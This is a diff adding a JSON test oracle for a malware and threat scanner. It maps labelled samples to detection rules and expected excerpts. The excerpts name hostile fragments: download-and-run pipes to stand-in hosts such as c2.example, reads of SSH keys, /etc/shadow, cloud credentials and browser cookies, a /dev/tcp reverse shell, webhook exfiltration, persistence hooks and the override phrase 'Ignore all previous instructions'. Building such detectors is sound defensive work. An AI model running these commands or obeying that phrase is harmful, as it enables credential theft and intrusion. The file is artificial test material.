@@ -1,0 +1,739 @@
+{
+  "schema": "threat_match_oracle/v1",
+  "contract": "Field-level parity for the shared regex rulepack layer (Go + Python). expected_shared_match freezes line/excerpt/excerpt_sha256 for the corpus-labelled rule_id. python_only_rule_ids are AST-only (Python); Go must not claim them.",
+  "python_only_rule_ids": [
+    "threat-py-ctypes-load",
+    "threat-py-os-system",
+    "threat-py-subprocess-shell",
+    "threat-py-syntax-parse-failed"
+  ],
+  "corpus_path": "apps/control-api/app/tests/fixtures/threat/corpus.json",
+  "vectors": [
+    {
+      "sample_id": "mal-download-exec-pipe",
+      "label": "malicious",
+      "filename": "bootstrap.sh",
+      "content_sha256": "3d03c7f053cbc0597311ab52988644577e3e9b95adb6dc6dce8f3134d2eb18c5",
+      "detected_type": "shell",
+      "expected_shared_match": {
+        "rule_id": "threat-download-exec-pipe",
+        "line": 3,
+        "excerpt": "curl -fsSL https://cdn.example-agent.io/",
+        "excerpt_sha256": "adc2797ae3dd6f64db0e6ac00ff955001af6799b8526f6aa509f57ff1eb42ec2",
+        "severity": "critical",
+        "confidence": 0.95
+      },
+      "shared_rule_ids": [
+        "threat-download-exec-pipe"
+      ],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "mal-download-exec-pipe-continued",
+      "label": "malicious",
+      "filename": "bootstrap-continued.sh",
+      "content_sha256": "afe774afae65730a49c8cbbd0bdc7d415691a57ee691ca11d209c2e794f1b872",
+      "detected_type": "shell",
+      "expected_shared_match": {
+        "rule_id": "threat-download-exec-pipe",
+        "line": 3,
+        "excerpt": "curl -fsSL https://cdn.example-agent.io/",
+        "excerpt_sha256": "adc2797ae3dd6f64db0e6ac00ff955001af6799b8526f6aa509f57ff1eb42ec2",
+        "severity": "critical",
+        "confidence": 0.95
+      },
+      "shared_rule_ids": [
+        "threat-download-exec-pipe"
+      ],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "mal-download-exec-pipe-pseudo",
+      "label": "malicious",
+      "filename": "bootstrap-pseudo.sh",
+      "content_sha256": "ee786ffdd84ed2ccf28e2e2c09c36df1b2617d06bca89db7574e58c708dad441",
+      "detected_type": "shell",
+      "expected_shared_match": {
+        "rule_id": "threat-download-exec-pipe",
+        "line": 3,
+        "excerpt": "curl -fsSL https://cdn.example-agent.io/",
+        "excerpt_sha256": "43d053c72010e13035d5b14762574d0b7ee6eb6611f43dcf9949e57caedb426b",
+        "severity": "critical",
+        "confidence": 0.95
+      },
+      "shared_rule_ids": [
+        "threat-download-exec-pipe"
+      ],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "mal-download-exec-pipe-unicode-ls",
+      "label": "malicious",
+      "filename": "bootstrap-unicode-ls.sh",
+      "content_sha256": "0899fb51beaad5f52efbcd1dd5035a25775082cf0b4bcbb5d44251257509a4ce",
+      "detected_type": "shell",
+      "expected_shared_match": {
+        "rule_id": "threat-download-exec-pipe",
+        "line": 3,
+        "excerpt": "curl -fsSL https://cdn.example-agent.io/",
+        "excerpt_sha256": "43d053c72010e13035d5b14762574d0b7ee6eb6611f43dcf9949e57caedb426b",
+        "severity": "critical",
+        "confidence": 0.95
+      },
+      "shared_rule_ids": [
+        "threat-download-exec-pipe"
+      ],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "benign-download-exec-notcurl-boundary",
+      "label": "benign",
+      "filename": "notcurl-wrap.sh",
+      "content_sha256": "5b3e3194b5c0a387db4797aa751beda261025079d9d201784fe83f12de6d6d8d",
+      "detected_type": "shell",
+      "expected_shared_match": null,
+      "shared_rule_ids": [],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "mal-download-exec-powershell",
+      "label": "malicious",
+      "filename": "update.ps1",
+      "content_sha256": "eae5510a58355009140efd95edb79e1b08fecf00fe2b2a8eb4a433d5a75ecbc7",
+      "detected_type": "powershell",
+      "expected_shared_match": {
+        "rule_id": "threat-download-exec-powershell",
+        "line": 2,
+        "excerpt": "IEX (New-Object Net.WebClient).DownloadS",
+        "excerpt_sha256": "673725f982cb3c7ac2c460d37e4fe65bb425a6bdac0b8ed0967e386e245406fb",
+        "severity": "critical",
+        "confidence": 0.95
+      },
+      "shared_rule_ids": [
+        "threat-download-exec-powershell"
+      ],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "mal-download-exec-powershell-continued",
+      "label": "malicious",
+      "filename": "update-continued.ps1",
+      "content_sha256": "7e92d4ae3dbe1d3eaa01cb0160b0f379f9a78aebe0e3992c6b31ce1eded1b1b2",
+      "detected_type": "powershell",
+      "expected_shared_match": {
+        "rule_id": "threat-download-exec-powershell",
+        "line": 2,
+        "excerpt": "iwr http://c2.example/update.ps1 | iex",
+        "excerpt_sha256": "64a0d71cb3a69a4436f0f51686edb7ea6634b460dd2cd162bd8e137c99d72ac4",
+        "severity": "critical",
+        "confidence": 0.95
+      },
+      "shared_rule_ids": [
+        "threat-download-exec-powershell"
+      ],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "mal-download-exec-powershell-pseudo",
+      "label": "malicious",
+      "filename": "update-pseudo.ps1",
+      "content_sha256": "d2ca38a232b41ca92ff7cb7201ead8ec5ddd3b4abfd75051e75ca0d669c24d14",
+      "detected_type": "powershell",
+      "expected_shared_match": {
+        "rule_id": "threat-download-exec-powershell",
+        "line": 2,
+        "excerpt": "iwr http://c2.example/update.ps1| iex",
+        "excerpt_sha256": "2dba4acb6d3cc1974a6feb587a4f3b37f611236018cc021139384adb4e2b34a8",
+        "severity": "critical",
+        "confidence": 0.95
+      },
+      "shared_rule_ids": [
+        "threat-download-exec-powershell"
+      ],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "mal-cred-ssh",
+      "label": "malicious",
+      "filename": "support-diag.sh",
+      "content_sha256": "d1ebd582738a3bfa0f2153a5bc8f2e8647a2f2dcceaf36d0deb6d2f2bed63e15",
+      "detected_type": "shell",
+      "expected_shared_match": {
+        "rule_id": "threat-cred-ssh",
+        "line": 3,
+        "excerpt": "~/.ssh/id_rsa",
+        "excerpt_sha256": "c84a706284235e56911ffb39e894433b0beae3c03e78b17afddb0d6b1a4d5117",
+        "severity": "high",
+        "confidence": 0.9
+      },
+      "shared_rule_ids": [
+        "threat-cred-ssh"
+      ],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "mal-cred-dotenv",
+      "label": "malicious",
+      "filename": "load-config.sh",
+      "content_sha256": "783502205ac55d44edbf53f86b2eb3fa800ef3affffaae06461c0d6f1a8d2d7c",
+      "detected_type": "shell",
+      "expected_shared_match": {
+        "rule_id": "threat-cred-dotenv",
+        "line": 3,
+        "excerpt": "cat /srv/app/.env",
+        "excerpt_sha256": "734e4d3625e27286eba2bd8a889b6c4b774f35dcd0a747667cceb19107f266a4",
+        "severity": "high",
+        "confidence": 0.85
+      },
+      "shared_rule_ids": [
+        "threat-cred-dotenv"
+      ],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "mal-cred-system-files",
+      "label": "malicious",
+      "filename": "diag.sh",
+      "content_sha256": "93148d8229bacf92e40a8d6a5d437ed1310b00e630b26471f1bbc53df814d7db",
+      "detected_type": "shell",
+      "expected_shared_match": {
+        "rule_id": "threat-cred-system-files",
+        "line": 3,
+        "excerpt": "/etc/shadow",
+        "excerpt_sha256": "7b5ddf499844cf05866927513cf62fee9af8c281812def040b964146b0ea87d6",
+        "severity": "high",
+        "confidence": 0.9
+      },
+      "shared_rule_ids": [
+        "threat-cred-system-files"
+      ],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "mal-cred-cloud",
+      "label": "malicious",
+      "filename": "sync-profile.sh",
+      "content_sha256": "e31cc2a0233097208005d4aaca01f74bab7eefa967aab415b7cc48eedfa32b60",
+      "detected_type": "shell",
+      "expected_shared_match": {
+        "rule_id": "threat-cred-cloud",
+        "line": 3,
+        "excerpt": ".aws/credentials",
+        "excerpt_sha256": "c0515f87612986c6296a343be4a69b67e142dd55076a885f2c8604eaf7cf694e",
+        "severity": "high",
+        "confidence": 0.9
+      },
+      "shared_rule_ids": [
+        "threat-cred-cloud"
+      ],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "mal-cred-browser-store",
+      "label": "malicious",
+      "filename": "collect.sh",
+      "content_sha256": "ffaa5ea14954e8ec28509d65946c68169a0cb5a42212c3a407af76cdb661ea68",
+      "detected_type": "shell",
+      "expected_shared_match": {
+        "rule_id": "threat-cred-browser-store",
+        "line": 2,
+        "excerpt": "Chrome/Default/Cookies",
+        "excerpt_sha256": "53ad62136ce5a6c31f994b9951522bac6aa34588e18cf517e73c3e3c85b7b434",
+        "severity": "high",
+        "confidence": 0.85
+      },
+      "shared_rule_ids": [
+        "threat-cred-browser-store"
+      ],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "mal-cred-hardcoded-secret",
+      "label": "malicious",
+      "filename": "run-agent.sh",
+      "content_sha256": "75e27be10b92d8391b469d39d2689067f37ac0680d4fe999f0a50c388bebe8f4",
+      "detected_type": "shell",
+      "expected_shared_match": {
+        "rule_id": "threat-cred-hardcoded-secret",
+        "line": 2,
+        "excerpt": "sk-***",
+        "excerpt_sha256": "3631b5f17840df1cb0575b3708c982cf0ad5f89a00a1b1af1dcdf21f75b9a1cf",
+        "severity": "high",
+        "confidence": 0.9
+      },
+      "shared_rule_ids": [
+        "threat-cred-hardcoded-secret"
+      ],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "mal-persist-crontab",
+      "label": "malicious",
+      "filename": "install.sh",
+      "content_sha256": "9db42b7f7a22ea8a60c4a8f865ca14c96566529fad61e861376ae5d155cc7877",
+      "detected_type": "shell",
+      "expected_shared_match": {
+        "rule_id": "threat-persist-crontab",
+        "line": 2,
+        "excerpt": "| crontab",
+        "excerpt_sha256": "13c0244b9f68cfc59580307a00d24ebda36563e10505171454491447556e65f7",
+        "severity": "high",
+        "confidence": 0.9
+      },
+      "shared_rule_ids": [
+        "threat-persist-crontab"
+      ],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "mal-persist-systemd",
+      "label": "malicious",
+      "filename": "install.sh",
+      "content_sha256": "cf1ce1c463ad7310ada9672477ae5f9a58580996001fb9728762330a9af4c047",
+      "detected_type": "shell",
+      "expected_shared_match": {
+        "rule_id": "threat-persist-systemd",
+        "line": 2,
+        "excerpt": "tee /etc/systemd/system",
+        "excerpt_sha256": "d28affb13024bed964cd2e9a3438cbbb395b7a88e89fc403d83778db43ed72a8",
+        "severity": "high",
+        "confidence": 0.9
+      },
+      "shared_rule_ids": [
+        "threat-persist-systemd"
+      ],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "mal-persist-launchd",
+      "label": "malicious",
+      "filename": "install-macos.sh",
+      "content_sha256": "fc67712a3875bf2ad75b2a58a262a8facdfaaf8b18803b337e94c70727f1562e",
+      "detected_type": "shell",
+      "expected_shared_match": {
+        "rule_id": "threat-persist-launchd",
+        "line": 2,
+        "excerpt": "Library/LaunchAgents",
+        "excerpt_sha256": "331f95037011d0ed3e45b531ac1155e50000dd0e71fc7ab483298a0f70f0d1aa",
+        "severity": "high",
+        "confidence": 0.9
+      },
+      "shared_rule_ids": [
+        "threat-persist-launchd"
+      ],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "mal-persist-shell-rc",
+      "label": "malicious",
+      "filename": "install.sh",
+      "content_sha256": "421a6dcfab357f58c199187ef26110f8a033f8421c70f55a4a08fccb3436c7e0",
+      "detected_type": "shell",
+      "expected_shared_match": {
+        "rule_id": "threat-persist-shell-rc",
+        "line": 2,
+        "excerpt": ">> ~/.bashrc",
+        "excerpt_sha256": "729c7057e692261fd0ebb5b9feea8a39ccbe9df76aee2a884c8f42f49138aa01",
+        "severity": "medium",
+        "confidence": 0.8
+      },
+      "shared_rule_ids": [
+        "threat-download-exec-pipe",
+        "threat-persist-shell-rc"
+      ],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "mal-persist-run-key",
+      "label": "malicious",
+      "filename": "install.ps1",
+      "content_sha256": "73ca1560e5d494c60514879c70718eb554913f4f57f58ff418c29d068cb935c8",
+      "detected_type": "powershell",
+      "expected_shared_match": {
+        "rule_id": "threat-persist-run-key",
+        "line": 1,
+        "excerpt": "\\CurrentVersion\\Run",
+        "excerpt_sha256": "4bdaf49cd6ca9c244dbf8d43f828ae374986ea2ec4e001581b3ed517ede36561",
+        "severity": "high",
+        "confidence": 0.9
+      },
+      "shared_rule_ids": [
+        "threat-persist-run-key"
+      ],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "mal-obf-base64-pipe-exec",
+      "label": "malicious",
+      "filename": "run.sh",
+      "content_sha256": "25452d69e27b942955d778337b7d39f1b41e935e3cf4bb5a67b154d002fa5ce6",
+      "detected_type": "shell",
+      "expected_shared_match": {
+        "rule_id": "threat-obf-base64-pipe-exec",
+        "line": 3,
+        "excerpt": "base64 -d | bash",
+        "excerpt_sha256": "ebc288645355f200d4b0be5c867e1fee50af8d5feeb23f6789f74e3ab6011e0a",
+        "severity": "high",
+        "confidence": 0.9
+      },
+      "shared_rule_ids": [
+        "threat-obf-base64-pipe-exec"
+      ],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "mal-obf-eval-dynamic",
+      "label": "malicious",
+      "filename": "loader.js",
+      "content_sha256": "f535c20e952b536642ad8df567f97abd5fa2c26719697f3ee5288bbfa9847049",
+      "detected_type": "javascript",
+      "expected_shared_match": {
+        "rule_id": "threat-obf-eval-dynamic",
+        "line": 2,
+        "excerpt": "eval(atob",
+        "excerpt_sha256": "97f1f8d59d74f8639491c3fed5236110afefcaeafac4a806006acc77aa5bd15a",
+        "severity": "high",
+        "confidence": 0.85
+      },
+      "shared_rule_ids": [
+        "threat-obf-eval-dynamic"
+      ],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "mal-obf-base64-blob",
+      "label": "malicious",
+      "filename": "payload.txt",
+      "content_sha256": "e8fb02a4734eaa34585041b8266f24ead07104c412df30448cfccc2b3e4c1be9",
+      "detected_type": "unknown",
+      "expected_shared_match": {
+        "rule_id": "threat-obf-base64-blob",
+        "line": 1,
+        "excerpt": "c+wDactmdkfNoq3ZG+Utzk6nHkcKiCBdSecz34Bl",
+        "excerpt_sha256": "6e67f577c40da052ef846ac18aa96cdebe3f38176ea2c2ce14596f71e4de136a",
+        "severity": "medium",
+        "confidence": 0.6
+      },
+      "shared_rule_ids": [
+        "threat-obf-base64-blob"
+      ],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "mal-obf-py-marshal",
+      "label": "malicious",
+      "filename": "loader.py",
+      "content_sha256": "5bb5cd499e2ee38ee2daa37e81f67db270b8856f81508837ba8ec2fb2d105f23",
+      "detected_type": "python",
+      "expected_shared_match": {
+        "rule_id": "threat-obf-py-marshal",
+        "line": 3,
+        "excerpt": "marshal.loads",
+        "excerpt_sha256": "457041e4da0525d7c5db89fb03d2c3029699d0da4fa064add4a44f5367cc09b5",
+        "severity": "high",
+        "confidence": 0.85
+      },
+      "shared_rule_ids": [
+        "threat-obf-py-marshal"
+      ],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "mal-net-reverse-shell",
+      "label": "malicious",
+      "filename": "callback.sh",
+      "content_sha256": "861f1dfb24c8dcded216a8a2b740dfc296e1fd4d6d7b81c89580a0e73f468d0c",
+      "detected_type": "shell",
+      "expected_shared_match": {
+        "rule_id": "threat-net-reverse-shell",
+        "line": 2,
+        "excerpt": "/dev/tcp/",
+        "excerpt_sha256": "c9c30219391767d39f04498c9a7490917f505edfd98a9f308aaafe00bba44062",
+        "severity": "critical",
+        "confidence": 0.95
+      },
+      "shared_rule_ids": [
+        "threat-net-reverse-shell"
+      ],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "mal-net-hardcoded-c2",
+      "label": "malicious",
+      "filename": "beacon.py",
+      "content_sha256": "2975108e28492b51718762cd8aca01d63ff27f41643a93c7fe901fa12652ef01",
+      "detected_type": "python",
+      "expected_shared_match": {
+        "rule_id": "threat-net-hardcoded-c2",
+        "line": 3,
+        "excerpt": "(\"185.220.101.7\", 4444)",
+        "excerpt_sha256": "68b497a7383c74785d3c43524175203f517279c3542fa4eb3980740a2f39a711",
+        "severity": "high",
+        "confidence": 0.8
+      },
+      "shared_rule_ids": [
+        "threat-net-hardcoded-c2"
+      ],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "mal-net-webhook-exfil",
+      "label": "malicious",
+      "filename": "exfil.py",
+      "content_sha256": "ccf744533c989d97b8e1484dd1c7349c4021fcb9b40e10e825870e3746ccfc78",
+      "detected_type": "python",
+      "expected_shared_match": {
+        "rule_id": "threat-net-webhook-exfil",
+        "line": 2,
+        "excerpt": "requests.post(\"https://discord.com/api/w",
+        "excerpt_sha256": "8ede7abaec5625b9408b48df02a870ed0d19752f4f93f349d0ee3ea2591d259d",
+        "severity": "medium",
+        "confidence": 0.7
+      },
+      "shared_rule_ids": [
+        "threat-net-webhook-exfil"
+      ],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "mal-prompt-injection",
+      "label": "malicious",
+      "filename": "note.txt",
+      "content_sha256": "8b7e411f1af21b69c43f6db970cae15c81398bbca5e74bcb6242d6dfa75cb22c",
+      "detected_type": "unknown",
+      "expected_shared_match": {
+        "rule_id": "threat-prompt-injection",
+        "line": 1,
+        "excerpt": "Ignore all previous instructions",
+        "excerpt_sha256": "2847bd141d1ca1b6d8f0f4badfde24547b96cbfa7c11f6fc6c2bedd05f057e52",
+        "severity": "high",
+        "confidence": 0.9
+      },
+      "shared_rule_ids": [
+        "threat-prompt-injection"
+      ],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "mal-py-os-system",
+      "label": "malicious",
+      "filename": "cleanup.py",
+      "content_sha256": "e07395ebabf3d2e63e59a9db106d846a492a07cbaae152fbe72ec28b11238790",
+      "detected_type": "python",
+      "expected_shared_match": {
+        "rule_id": "threat-py-os-system-regex",
+        "line": 5,
+        "excerpt": "os.system(",
+        "excerpt_sha256": "5d8947ebf6201095ef120aaac26bad5301a6a8462bf64e4f77440633b191724d",
+        "severity": "high",
+        "confidence": 0.9
+      },
+      "shared_rule_ids": [
+        "threat-py-os-system-regex"
+      ],
+      "python_only_rule_ids": [
+        "threat-py-os-system"
+      ]
+    },
+    {
+      "sample_id": "mal-py-subprocess-shell",
+      "label": "malicious",
+      "filename": "deploy.py",
+      "content_sha256": "4cd567c1456c59d380a7d3326a104f5c77830ad69adcebb3913bf071d1efa7bf",
+      "detected_type": "python",
+      "expected_shared_match": {
+        "rule_id": "threat-py-subprocess-shell-regex",
+        "line": 5,
+        "excerpt": "subprocess.run(f\"scp {f} user@{host}:/tm",
+        "excerpt_sha256": "1f9d742431ca70b9c747c7dafede9a0ce81587c95573c5caad4dc7ab85673292",
+        "severity": "high",
+        "confidence": 0.85
+      },
+      "shared_rule_ids": [
+        "threat-py-subprocess-shell-regex"
+      ],
+      "python_only_rule_ids": [
+        "threat-py-subprocess-shell"
+      ]
+    },
+    {
+      "sample_id": "mal-py-ctypes",
+      "label": "malicious",
+      "filename": "helper.py",
+      "content_sha256": "181c9889db4c154229bad76dcf65d7e60a794445f34e5992f76b6ebacd7a17e9",
+      "detected_type": "python",
+      "expected_shared_match": {
+        "rule_id": "threat-py-ctypes-regex",
+        "line": 3,
+        "excerpt": "ctypes.CDLL(",
+        "excerpt_sha256": "3cbe75938976d9942a349a11d0dbb542e85b6ef1fb0d3408b253e9232623c0db",
+        "severity": "medium",
+        "confidence": 0.8
+      },
+      "shared_rule_ids": [
+        "threat-py-ctypes-regex"
+      ],
+      "python_only_rule_ids": [
+        "threat-py-ctypes-load"
+      ]
+    },
+    {
+      "sample_id": "mal-py-dangerous-import",
+      "label": "malicious",
+      "filename": "loader.py",
+      "content_sha256": "b86dd7e9bb69edfead7509db4ef0093df3bf151b699f0cf36b8dc1cf6b3037a7",
+      "detected_type": "python",
+      "expected_shared_match": {
+        "rule_id": "threat-py-dangerous-import",
+        "line": 1,
+        "excerpt": "__import__(\"socket\")",
+        "excerpt_sha256": "6b3bc0d168c7efb025c159c5c1ad15ff22f65481c6656eb17327fca69b25553d",
+        "severity": "high",
+        "confidence": 0.9
+      },
+      "shared_rule_ids": [
+        "threat-py-dangerous-import"
+      ],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "benign-installer-download-then-review",
+      "label": "benign",
+      "filename": "bootstrap.sh",
+      "content_sha256": "e873c655c4d517290f5a8e1981b7959a26fe46e5498e3cc1aa7e7a857bfa059c",
+      "detected_type": "shell",
+      "expected_shared_match": null,
+      "shared_rule_ids": [],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "benign-ssh-config-read",
+      "label": "benign",
+      "filename": "check-ssh.sh",
+      "content_sha256": "3bdb9f18c9c90d43be4c6db7434705968408f24b0b545a9e1bd32606b2fd3092",
+      "detected_type": "shell",
+      "expected_shared_match": null,
+      "shared_rule_ids": [],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "benign-subprocess-arg-list",
+      "label": "benign",
+      "filename": "clone.py",
+      "content_sha256": "8e0699ff17dc0062ffffd479603c3a99ea5a85190ead6b8e7e5b0d1ae3d29ab4",
+      "detected_type": "python",
+      "expected_shared_match": null,
+      "shared_rule_ids": [],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "benign-crontab-list-readonly",
+      "label": "benign",
+      "filename": "backup-cron.sh",
+      "content_sha256": "4185c174513a4750f4da6c86b7b022508508097a015200da86715bd016abd9d4",
+      "detected_type": "shell",
+      "expected_shared_match": null,
+      "shared_rule_ids": [],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "benign-systemd-status-check",
+      "label": "benign",
+      "filename": "healthcheck.sh",
+      "content_sha256": "12b2fa787a029187e0660ff9806befebbb65e63f09f426f23a35cbaac4204aae",
+      "detected_type": "shell",
+      "expected_shared_match": null,
+      "shared_rule_ids": [],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "benign-bashrc-idempotent-check",
+      "label": "benign",
+      "filename": "setup.sh",
+      "content_sha256": "39113fe229b9a69a9b651a221aae3423bd6be33e87553cf7a1661cafb3d18b9a",
+      "detected_type": "shell",
+      "expected_shared_match": null,
+      "shared_rule_ids": [],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "benign-base64-encode-artifact",
+      "label": "benign",
+      "filename": "package.sh",
+      "content_sha256": "bb05f92c91812aa610f7be29fbd42e5086d42eddc1b90a4a8155d453ac4a43b7",
+      "detected_type": "shell",
+      "expected_shared_match": null,
+      "shared_rule_ids": [],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "benign-internal-health-webhook",
+      "label": "benign",
+      "filename": "healthping.py",
+      "content_sha256": "81c9cfc3bd6a3fe6625302dd3042639f8e1c41a631bc21dec79a2aa70c86ebdd",
+      "detected_type": "python",
+      "expected_shared_match": null,
+      "shared_rule_ids": [],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "benign-token-mentioned-in-prose",
+      "label": "benign",
+      "filename": "audit.log",
+      "content_sha256": "2a03ba2be240d2b5c2654aba0c15dbb2f3966a294d54e8f1e423389027cc59f7",
+      "detected_type": "unknown",
+      "expected_shared_match": null,
+      "shared_rule_ids": [],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "benign-boto3-instance-role",
+      "label": "benign",
+      "filename": "list_buckets.py",
+      "content_sha256": "c278dac9735e03b92610429cf8e40d88aa73c168129602c377c4688dc93e940d",
+      "detected_type": "python",
+      "expected_shared_match": null,
+      "shared_rule_ids": [],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "benign-password-mentioned-in-prose",
+      "label": "benign",
+      "filename": "reminder.txt",
+      "content_sha256": "d3dccba4a5c0046b4fe3a25934f7a3ff8b21028da44643abc59c34563d0135d9",
+      "detected_type": "unknown",
+      "expected_shared_match": null,
+      "shared_rule_ids": [],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "benign-short-base64-config-value",
+      "label": "benign",
+      "filename": "config.py",
+      "content_sha256": "cdefbc03775e36af3ca488178f76a095878a637b32696690a32e54794e49c589",
+      "detected_type": "python",
+      "expected_shared_match": null,
+      "shared_rule_ids": [],
+      "python_only_rule_ids": []
+    },
+    {
+      "sample_id": "fp-socket-bind-tuple",
+      "label": "benign_known_fp",
+      "filename": "server.py",
+      "content_sha256": "669afc1244522e38f61d96a019215a03521f1278e01de3855d5d513131cd54e0",
+      "detected_type": "python",
+      "expected_shared_match": {
+        "rule_id": "threat-net-hardcoded-c2",
+        "line": 4,
+        "excerpt": "(\"0.0.0.0\", 8080)",
+        "excerpt_sha256": "28ad7996340996516d3c500ae32dc8cc177ec2719347c218079da50f64fb97b9",
+        "severity": "high",
+        "confidence": 0.8
+      },
+      "shared_rule_ids": [
+        "threat-net-hardcoded-c2"
+      ],
+      "python_only_rule_ids": []
+    }
+  ]
+}
